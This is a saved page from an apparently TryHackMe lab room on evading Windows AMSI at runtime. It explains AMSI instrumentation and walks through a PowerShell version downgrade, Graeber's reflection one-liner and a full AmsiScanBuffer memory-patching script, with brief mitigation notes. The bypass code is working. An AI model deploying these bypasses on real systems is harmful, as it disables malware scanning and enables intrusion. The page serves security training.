                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********************" value="" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse4" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 4                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> AMSI Instrumentation
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>The way AMSI is instrumented can be complex, including multiple DLLs and varying execution strategies depending on where it is instrumented. By definition, AMSI is only an interface for other anti-malware products; AMSI will use multiple provider DLLs and API calls depending on what is being executed and at what layer it is being executed.</p>
<p>AMSI is instrumented from <code>System.Management.Automation.dll</code>, a .NET assembly developed by Windows;<span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">From the Microsoft docs, "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications."</span><span style="font-size:1rem">&nbsp;The .NET assembly will instrument other DLLs and API calls depending on the interpreter and whether it is on disk or memory. The below diagram depicts how data is dissected as it flows through the layers and what DLLs/API calls are being instrumented.</span></p><p style="text-align:center"><img src="./TryHackMe _ Runtime Detection Evasion_files/35e16d45ce27145fcdf231fdb8dcb35e.png" style="width:768.5px;height:427.765px"><br></p><p>In the above graph data will begin flowing dependent on the interpreter used (PowerShell/VBScript/etc.)&nbsp; Various API calls and interfaces will be instrumented as the data flows down the model at each layer. It is important to understand the complete model of AMSI, but we can break it down into core components, shown in the diagram below.&nbsp;</p><p style="text-align:center"><img src="./TryHackMe _ Runtime Detection Evasion_files/efca9438e858f0476a4ffd777c36501a.png" style="width:869.5px;height:160.428px"><br></p><p>Note: AMSI is only instrumented when loaded from memory when executed from the CLR. It is assumed that if on disk MsMpEng.exe (Windows Defender) is already being instrumented.</p><p>Most of our research and known bypasses are placed in the Win32 API layer, manipulating the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer">AmsiScanBuffer</a>&nbsp;API call.</p><p><span>You may also notice the "Other Applications" interface from AMSI. Third-parties such as <a class="OQBz1BRS glossary-term" onclick="initPopOver(&#39;AV&#39;, &#39;OQBz1BRS&#39;)">AV</a> providers can instrument AMSI from their products. Microsoft documents&nbsp;</span><a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions">AMSI functions</a>&nbsp;and the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream">AMSI stream interface</a>.</p><hr>


<p><span>We can break down the code for AMSI <a class="0OkaZLPh glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;0OkaZLPh&#39;)">PowerShell</a> instrumentation to better understand how it is implemented and checks for suspicious content. To find where AMSI is instrumented, we can use&nbsp;</span><a href="https://github.com/PowerShell/PowerShell/compare/master...cobbr:master">InsecurePowerShell</a>&nbsp;maintained by&nbsp;<a href="https://github.com/cobbr">Cobbr</a><span>. Insecure<a class="YaYktLIk glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;YaYktLIk&#39;)">PowerShell</a> is a GitHub fork of PowerShell with security features removed; this means we can look through the compared commits and observe any security features. AMSI is only instrumented in twelve lines of code under&nbsp;</span><code>src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs</code>. These twelve lines are shown below.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">var scriptExtent <span class="token operator">=</span> scriptBlockAst<span class="token punctuation">.</span>Extent<span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>AmsiUtils<span class="token punctuation">.</span><span class="token function">ScanContent</span><span class="token punctuation">(</span>scriptExtent<span class="token punctuation">.</span>Text<span class="token punctuation">,</span> scriptExtent<span class="token punctuation">.</span>File<span class="token punctuation">)</span> <span class="token operator">==</span> AmsiUtils<span class="token punctuation">.</span>AmsiNativeMethods<span class="token punctuation">.</span>AMSI_RESULT<span class="token punctuation">.</span>AMSI_RESULT_DETECTED<span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
  var parseError <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ParseError</span><span class="token punctuation">(</span>scriptExtent<span class="token punctuation">,</span> <span class="token string">"ScriptContainedMaliciousContent"</span><span class="token punctuation">,</span> ParserStrings<span class="token punctuation">.</span>ScriptContainedMaliciousContent<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token function">ParseException</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> parseError <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>

 <span class="token keyword">if</span> <span class="token punctuation">(</span>ScriptBlock<span class="token punctuation">.</span><span class="token function">CheckSuspiciousContent</span><span class="token punctuation">(</span>scriptBlockAst<span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
  HasSuspiciousContent <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>

</code></pre><hr><p>






</p><p>We can take our knowledge of how AMSI is instrumented and research from others to create and use bypasses that abuse and evade AMSI or its utilities.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and answer the question below.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Will AMSI be instrumented if the file is only on disk? (Y/N)</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse5" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 5                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> PowerShell Downgrade
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-size:1rem"><span>The <a class="c7PAo5Bb glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;c7PAo5Bb&#39;)" data-original-title="" title="">PowerShell</a> downgrade attack is a very low-hanging fruit that allows attackers to modify the current PowerShell version to remove security features.</span></span><br></p><p><span>Most <a class="UXLJ10Zh glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;UXLJ10Zh&#39;)">PowerShell</a> sessions will start with the most recent PowerShell engine, but attackers can manually change the version with a one-liner. By "downgrading" the PowerShell version to 2.0, you bypass security features since they were not implemented until version 5.0.</span></p><p><span>The attack only requires a one-liner to execute in our session. We can launch a new <a class="sb861QEH glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;sb861QEH&#39;)">PowerShell</a> process with the flags </span><code>-Version</code> to specify the version (2).</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span><a class="CRgpemKw glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;CRgpemKw&#39;)">PowerShell</a> </span><span class="token operator">-</span>Version 2</code></pre><p>This attack can actively be seen exploited in tools such as&nbsp;<a href="https://github.com/trustedsec/unicorn">Unicorn</a>.</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell">full_attack = <span class="token string">'''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '</span>"'
</code></pre><p>Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.</p><p>






</p><p><span>The two easiest mitigations are removing the <a class="9DAJYx3z glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;9DAJYx3z&#39;)">PowerShell</a> 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Read the above and practice downgrading PowerShell on the provided machine.
                            </span></div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Enter the flag obtained from the desktop after executing the command in <i>cmd.exe.</i>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*********************}" value="" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse6" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 6                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> PowerShell Reflection
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Reflection allows a user or administrator to access and interact with .NET assemblies. From the Microsoft docs, "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications." .NET assemblies may seem foreign; however, we can make them more familiar by knowing they take shape in familiar formats such as exe (<strong>exe</strong>cutable) and dll (<strong>d</strong>ynamic-<strong>l</strong>ink&nbsp;<strong>l</strong>ibrary).</p><p><span><a class="F2ASzn0w glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;F2ASzn0w&#39;)">PowerShell</a> reflection can be abused to modify and identify information from valuable DLLs.</span></p><p><span>The AMSI utilities for <a class="OuB97CaW glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;OuB97CaW&#39;)">PowerShell</a> are stored in the </span><code>AMSIUtils</code> .NET assembly located in <code>System.Management.Automation.AmsiUtils</code>.</p><p>Matt Graeber published a one-liner to accomplish the goal of using Reflection to modify and bypass the AMSI utility. This one-line can be seen in the code block below.</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">'amsiInitFailed'</span><span class="token punctuation">,</span><span class="token string">'NonPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$true</span><span class="token punctuation">)</span>
</code></pre><p>To explain the code functionality, we will break it down into smaller sections.</p><p>First, the snippet will call the reflection function and specify it wants to use an assembly from <code>[Ref.Assembly]</code> it will then obtain the type of the AMSI utility using <code>GetType</code>.</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span>
</code></pre><p>The information collected from the previous section will be forwarded to the next function to obtain a specified field within the assembly using <code>GetField</code>.</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">'amsiInitFailed'</span><span class="token punctuation">,</span><span class="token string">'NonPublic,Static'</span><span class="token punctuation">)</span>
</code></pre><p>The assembly and field information will then be forwarded to the next parameter to set the value from <code>$false</code> to <code>$true</code> using <code>SetValue</code>.</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$true</span><span class="token punctuation">)</span>
</code></pre><p>











</p><p>Once the <code>amsiInitFailed</code> field is set to <code>$true</code>, AMSI will respond with the response code: AMSI_RESULT_NOT_DETECTED = 1</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and practice leveraging the one-liner on the provided machine.<br>To utilize the one-liner, you can run it in the same session as the desired malicious code or prepend it to the malicious code.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        <div class="room-task-input-hint"><button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button></div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <div><span style="font-size:1rem">Enter the flag obtained from the desktop after executing the command.</span><br></div>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{**********************}" value="" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse7" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 7                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Patching AMSI
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <div>
<img src="./TryHackMe _ Runtime Detection Evasion_files/03c0d034fc2d3c85b98520153b25790e.png" style="float:right;width:241px;height:271.549px" class="note-float-right">

<p>AMSI is primarily instrumented and loaded from <code>amsi.dll</code>; this can be confirmed from the diagram we observed earlier. This dll can be abused and forced to point to a response code we want. The <code>AmsiScanBuffer</code> function provides us the hooks and functionality we need to access the pointer/buffer for the response code.</p><p><code>AmsiScanBuffer</code> is vulnerable because <code>amsi.dll</code><span> is loaded into the <a class="elHdGxYg glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;elHdGxYg&#39;)">PowerShell</a> process at startup; our session has the same permission level as the utility.</span></p><p><code>AmsiScanBuffer</code> will scan a "<a href="https://en.wikipedia.org/wiki/Data_buffer">buffer</a>" of suspected code and report it to <code>amsi.dll</code> to determine the response. We can control this function and overwrite the buffer with a clean return code. To identify the buffer needed for the return code, we need to do some reverse engineering; luckily, this research and reverse engineering have already been done. We have the exact return code we need to obtain a clean response!</p><p>We will break down a code snippet modified by BC-Security and inspired by Tal Liberman; you can find the original code&nbsp;<a href="https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py">here</a>. RastaMouse also has a similar bypass written in C# that uses the same technique; you can find the code&nbsp;<a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">here</a>.</p><p>At a high-level AMSI patching can be broken up into four steps,</p>
</div>
<ol>
<li>Obtain handle of <code>amsi.dll</code></li>
<li>Get process address of <code>AmsiScanBuffer</code></li>
<li>Modify memory protections of <code>AmsiScanBuffer</code></li>
<li>Write opcodes to <code>AmsiScanBuffer</code></li>
</ol><p>We first need to load in any external libraries or API calls we want to utilize; we will load&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a>,&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea">GetModuleHandle</a>, and&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a>&nbsp;from&nbsp;<strong>kernel32</strong>&nbsp;using&nbsp;<a href="https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke">p/invoke</a>.</p><pre class=" language-csharp" tabindex="0"><code class=" language-csharp"><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span>`<span class="token string">"kernel32`"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token comment"><span>// Import <a class="fg64qLNT glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;fg64qLNT&#39;)">DLL</a> where API call is stored</span></span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span> <span class="token comment">// API Call to import</span>
	<span class="token class-name">IntPtr</span> hModule<span class="token punctuation">,</span> <span class="token comment"><span>// Handle to <a class="WFSiYHsx glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;WFSiYHsx&#39;)">DLL</a> module</span></span>
	<span class="token keyword">string</span> procName <span class="token comment">// function or variable to obtain</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span>`<span class="token string">"kernel32`"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>
	<span class="token keyword">string</span> lpModuleName <span class="token comment">// Module to obtain handle</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span>`<span class="token string">"kernel32`"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>
	<span class="token class-name">IntPtr</span> lpAddress<span class="token punctuation">,</span> <span class="token comment">// Address of region to modify</span>
	<span class="token class-name">UIntPtr</span> dwSize<span class="token punctuation">,</span> <span class="token comment">// Size of region</span>
	<span class="token class-name"><span class="token keyword">uint</span></span> flNewProtect<span class="token punctuation">,</span> <span class="token comment">// Memory protection options</span>
	<span class="token keyword">out</span> <span class="token keyword">uint</span> lpflOldProtect <span class="token comment">// Pointer to store previous protection options</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>The functions are now defined, but we need to load the API calls using <code>Add-Type</code>. This cmdlet will load the functions with a proper type and namespace that will allow the functions to be called.</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token variable">$Kernel32</span> = <span class="token function">Add-Type</span> <span class="token operator">-</span>MemberDefinition <span class="token variable">$MethodDefinition</span> <span class="token operator">-</span>Name <span class="token string">'Kernel32'</span> <span class="token operator">-</span>NameSpace <span class="token string">'Win32'</span> <span class="token operator">-</span>PassThru<span class="token punctuation">;</span>
</code></pre><p>Now that we can call our API functions, we can identify where <code>amsi.dll</code> is located and how to get to the function. First, we need to identify the process handle of AMSI using <code>GetModuleHandle</code>. The handle will then be used to identify the process address of <code>AmsiScanBuffer</code> using <code>GetProcAddress</code>.</p><pre class=" language-csharp" tabindex="0"><code class=" language-csharp">$handle <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">Win32<span class="token punctuation">.</span>Kernel32</span></span><span class="token punctuation">]</span><span class="token punctuation">::</span><span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>
	'amsi<span class="token punctuation">.</span>dll' <span class="token comment">// Obtains handle to amsi.dll</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">IntPtr</span></span><span class="token punctuation">]</span>$BufferAddress <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">Win32<span class="token punctuation">.</span>Kernel32</span></span><span class="token punctuation">]</span><span class="token punctuation">::</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>
	$handle<span class="token punctuation">,</span> <span class="token comment">// Handle of amsi.dll</span>
	'AmsiScanBuffer' <span class="token comment">// API call to obtain</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>Next, we need to modify the memory protection of the <code>AmsiScanBuffer</code> process region. We can specify parameters and the buffer address for <code>VirtualProtect</code>.</p><p>Information on the parameters and their values can be found from the previously mentioned API documentation.</p><pre class=" language-csharp" tabindex="0"><code class=" language-csharp"><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">UInt32</span></span><span class="token punctuation">]</span>$Size <span class="token operator">=</span> <span class="token number">0x5</span><span class="token punctuation">;</span> <span class="token comment">// Size of region</span>
<span class="token punctuation">[</span>UInt32<span class="token punctuation">]</span>$ProtectFlag <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// PAGE_EXECUTE_READWRITE</span>
<span class="token punctuation">[</span>UInt32<span class="token punctuation">]</span>$OldProtectFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// Arbitrary value to store options</span>
<span class="token punctuation">[</span>Win32<span class="token punctuation">.</span>Kernel32<span class="token punctuation">]</span><span class="token punctuation">::</span><span class="token function">VirtualProtect</span><span class="token punctuation">(</span>
	$BufferAddress<span class="token punctuation">,</span> <span class="token comment">// Point to AmsiScanBuffer</span>
	$Size<span class="token punctuation">,</span> <span class="token comment">// Size of region</span>
	$ProtectFlag<span class="token punctuation">,</span> <span class="token comment">// Enables R or RW access to region</span>
	<span class="token punctuation">[</span>Ref<span class="token punctuation">]</span>$OldProtectFlag <span class="token comment">// Pointer to store old options</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>We need to specify what we want to overwrite the buffer with; the process to identify this buffer can be found&nbsp;<a href="https://rastamouse.me/memory-patching-amsi-bypass/">here</a>. Once the buffer is specified, we can use&nbsp;<a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0">marshal copy</a>&nbsp;to write to the process.</p><pre class=" language-csharp" tabindex="0"><code class=" language-csharp">$buf <span class="token operator">=</span> <span class="token punctuation">[</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">UInt32</span></span><span class="token punctuation">]</span><span class="token number">0xB8</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">UInt32</span></span><span class="token punctuation">]</span><span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">UInt32</span></span><span class="token punctuation">]</span><span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">Uint32</span></span><span class="token punctuation">]</span><span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">Uint32</span></span><span class="token punctuation">]</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">Uint32</span></span><span class="token punctuation">]</span><span class="token number">0xC3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">system<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>interopservices<span class="token punctuation">.</span>marshal</span></span><span class="token punctuation">]</span><span class="token punctuation">::</span><span class="token function">copy</span><span class="token punctuation">(</span>
	$buf<span class="token punctuation">,</span> <span class="token comment">// Opcodes/array to write</span>
	<span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// Where to start copying in source array </span>
	$BufferAddress<span class="token punctuation">,</span> <span class="token comment">// Where to write (AsmiScanBuffer)</span>
	<span class="token number">6</span> <span class="token comment">// Number of elements/opcodes to write</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>
















</p><p>At this stage, we should have an AMSI bypass that works! It should be noted that with most tooling, signatures and detections can and are crafted to detect this script.&nbsp;</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and execute/observe the script on the provided machine.<br>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <div><span style="font-size:1rem">Enter the flag obtained from the desktop after executing the command.</span><br></div>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{************************************}" value="" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        <div class="room-task-input-hint"><button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button></div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse8" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 8                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Automating for Fun and Profit
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>While it is preferred to use the previous methods shown in this room, attackers can use other automated tools to break AMSI signatures or compile a bypass.</p>
<p>The first automation tool we will look at is <a href="http://amsi.fail/">amsi.fail</a></p>
<p><a href="http://amsi.fail/">amsi.fail</a><span> will compile and generate a <a class="Qu7KpA4o glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;Qu7KpA4o&#39;)">PowerShell</a> bypass from a collection of known bypasses. From amsi.fail, "AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before obfuscating. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures."</span></p>
